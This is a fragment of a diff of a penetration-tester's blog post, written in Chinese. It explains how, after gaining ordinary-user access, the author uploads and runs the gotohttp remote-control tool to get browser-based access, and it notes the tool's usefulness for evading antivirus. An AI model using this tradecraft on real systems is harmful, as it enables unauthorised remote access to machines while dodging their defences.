     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>gotohttp 在我的渗透测试过程中，是一个常见的方式，给我的感觉，即用即连，浏览器连接，方便快捷。但是缺点就是权限划分明确，普通用户权限起的 gotohttp 无法进行管理员权限操作，比如关闭 windows defender 和其他一些行为，不过在规避杀软这儿也有奇效。</p>
+</h1><p>gotohttp 在我的渗透测试过程中，是一个常见的方式，给我的感觉，即用即连，浏览器连接，方便快捷。但是缺点就是权限划分明确，普通用户权限起的 gotohttp 无法进行管理员权限操作，比如关闭 windows defender 和其他一些行为，不过在规避杀软这儿也有奇效。</p>
 <p>复现过程</p>
 <p>普通用户上去之后只能用普通用户权限，这里下载对应的 gotohttp 上传上去，命令行运行他，直接在当前目录下生成配置文件，读取配置文件，即可成功连接。</p>
 <pre tabindex="0"><code>https://gotohttp.com/</code></pre><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091147524.webp" alt="image-20240109114732991" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091147524.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091147524.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202401091147524.webp?size=large 2x" data-title="image-20240109114732991" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
